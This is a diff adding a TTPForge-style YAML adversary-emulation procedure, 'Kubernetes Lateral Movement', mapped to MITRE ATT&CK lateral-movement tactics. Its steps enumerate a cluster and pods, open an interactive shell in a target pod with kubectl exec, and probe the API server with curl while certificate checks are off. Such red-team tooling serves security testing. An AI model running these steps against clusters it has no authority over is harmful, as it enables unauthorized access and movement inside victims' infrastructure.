@@ -1,0 +1,57 @@
+---
+api_version: 2.0
+uuid: d4e5f6a7-b8c9-01d2-e3f4-a5b6c7d8e9f0
+name: Kubernetes Lateral Movement
+authors:
+  - TTPForge
+description: |
+  Exploit Kubernetes cluster misconfigurations for lateral movement between pods and nodes.
+
+mitre:
+  tactics:
+    - "TA0008 Lateral Movement"
+  techniques:
+    - "T1610 Deploy Container"
+
+requirements:
+  platforms:
+    - os: linux
+
+args:
+  - name: k8s_api_server
+    description: "Kubernetes API server address"
+    type: string
+    default: "192.168.1.110"
+  - name: k8s_namespace
+    description: "Target namespace"
+    type: string
+    default: "default"
+  - name: target_pod
+    description: "Target pod name"
+    type: string
+    default: "app-pod"
+
+steps:
+  - name: enumerate_kubernetes_clusters
+    description: Enumerate Kubernetes clusters
+    inline: |
+      kubectl cluster-info 2>/dev/null || echo 'K8s enumeration'
+    cleanup:
+      inline: |
+        echo "Kubernetes lateral movement step complete"
+  - name: list_pods_in_namespace
+    description: List pods in target namespace
+    inline: |
+      kubectl get pods -n {{ .Args.k8s_namespace }} 2>/dev/null || echo 'Pod enumeration'
+  - name: execute_command_in_pod
+    description: Execute command in target pod
+    inline: |
+      kubectl exec -it {{ .Args.target_pod }} -n {{ .Args.k8s_namespace }} -- /bin/sh 2>/dev/null || echo 'Pod access attempt'
+  - name: verify_kubernetes_api_access
+    description: Verify Kubernetes API access
+    inline: |
+      curl -k https://{{ .Args.k8s_api_server }}:6443 2>/dev/null | grep -q kubernetes && echo 'K8s API accessible' || echo 'K8s API not accessible'
+
+tests:
+  - name: dry_run_kubernetes_lateral_movement
+    dry_run: true
